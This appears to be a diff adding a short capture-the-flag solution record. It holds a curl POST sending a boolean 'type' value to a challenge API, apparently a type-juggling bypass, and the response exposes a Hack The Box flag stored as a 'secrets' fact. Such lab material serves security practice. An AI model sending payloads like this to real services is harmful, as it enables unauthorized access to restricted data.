@@ -1,0 +1,12 @@
+curl -s "http://94.237.54.48:57339/api/getfacts" -X POST -H "Content-Type: application/json" -d '{"type": true}'  | jq
+{
+  "facts": [
+    {
+      "id": 19,
+      "fact": "HTB{juggl1ng_1s_d4ng3r0u5!!!}",
+      "fact_type": "secrets"
+    }
+  ]
+}
+
+
